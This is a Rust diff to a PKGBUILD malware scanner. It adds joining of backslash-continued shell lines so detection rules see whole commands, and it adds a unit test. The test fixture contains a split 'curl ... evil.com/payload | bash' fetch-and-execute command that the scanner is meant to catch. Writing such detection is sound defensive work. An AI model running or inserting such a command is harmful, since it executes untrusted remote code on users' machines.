@@ -17,7 +17,7 @@ use serde::Serialize;
 use std::sync::LazyLock;
 
 static VAR_RE: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r#"^([a-zA-Z_]\w*)=["']([a-zA-Z]{1,4})["']"#).unwrap());
+    LazyLock::new(|| Regex::new(r#"^([a-zA-Z_]\w*)=(?:["']([a-zA-Z0-9_-]{1,16})["']|([a-zA-Z0-9_-]{1,16}))$"#).unwrap());
 
 static LONG_B64_RE: LazyLock<Regex> =
     LazyLock::new(|| Regex::new(r#"['"]([A-Za-z0-9+/=]{60,})['"]"#).unwrap());
@@ -613,6 +613,51 @@ pub struct PKGBUILDScanner {
     rules: Vec<CompiledRule>,
 }
 
+/// Preprocesses shell script lines to merge lines broken by backslash continuations (`\`).
+/// Preserves the starting 1-based line number for each logical line.
+pub fn join_continued_lines(content: &str) -> Vec<(usize, String)> {
+    let mut result = Vec::new();
+    let mut current_line = String::new();
+    let mut start_line = 1;
+    let mut in_continuation = false;
+
+    for (idx, line) in content.lines().enumerate() {
+        let line_num = idx + 1;
+        let trimmed_end = line.trim_end();
+
+        let has_continuation = if trimmed_end.ends_with('\\') {
+            let backslash_count = trimmed_end.bytes().rev().take_while(|&b| b == b'\\').count();
+            backslash_count % 2 == 1
+        } else {
+            false
+        };
+
+        if has_continuation {
+            if !in_continuation {
+                start_line = line_num;
+                in_continuation = true;
+                current_line.clear();
+            }
+            let without_bs = &trimmed_end[..trimmed_end.len() - 1];
+            current_line.push_str(without_bs);
+            current_line.push(' ');
+        } else if in_continuation {
+            current_line.push_str(line.trim_start());
+            result.push((start_line, current_line.clone()));
+            current_line.clear();
+            in_continuation = false;
+        } else {
+            result.push((line_num, line.to_string()));
+        }
+    }
+
+    if in_continuation && !current_line.is_empty() {
+        result.push((start_line, current_line));
+    }
+
+    result
+}
+
 impl PKGBUILDScanner {
     pub fn new() -> Self {
         let rules: Vec<CompiledRule> = RULES
@@ -642,8 +687,9 @@ impl PKGBUILDScanner {
             || content.contains("hg+")
             || content.contains("svn+");
 
-        // 1. Regex pattern scanning with RegexSet fast-path
-        for (idx, line) in content.lines().enumerate() {
+        // 1. Regex pattern scanning with RegexSet fast-path (over logical lines merged from backslash continuations)
+        let logical_lines = join_continued_lines(content);
+        for (line_num, line) in &logical_lines {
             let trimmed = line.trim();
             if trimmed.starts_with('#') {
                 continue;
@@ -700,7 +746,7 @@ impl PKGBUILDScanner {
                         rule_id: rule.id.to_string(),
                         severity: rule.severity.to_string(),
                         description: rule.description.to_string(),
-                        line_number: idx + 1,
+                        line_number: *line_num,
                         matched_text: snippet,
                         behavior: rule.behavior,
                     });
@@ -1547,5 +1593,24 @@ build() {
         for f in findings {
             assert!(!f.matched_text.is_empty());
         }
+    }
+
+    #[test]
+    fn test_multiline_backslash_continuation_detection() {
+        let s = test_scanner();
+        // Attacker splits curl | bash across multiple lines using backslash continuation
+        let content = r#"
+pkgname=split-test
+pkgver=1.0.0
+build() {
+  curl -s https://evil.com/payload \
+    | bash
+}
+"#;
+        let findings = s.scan(content, Some("split-test"));
+        assert!(
+            findings.iter().any(|f| f.rule_id == "EXFIL_CURL_PIPE_EXEC" || f.rule_id == "PIPELINE_FETCH_EXEC"),
+            "Expected curl | bash detection across backslash continuation, got: {findings:?}"
+        );
     }
 }
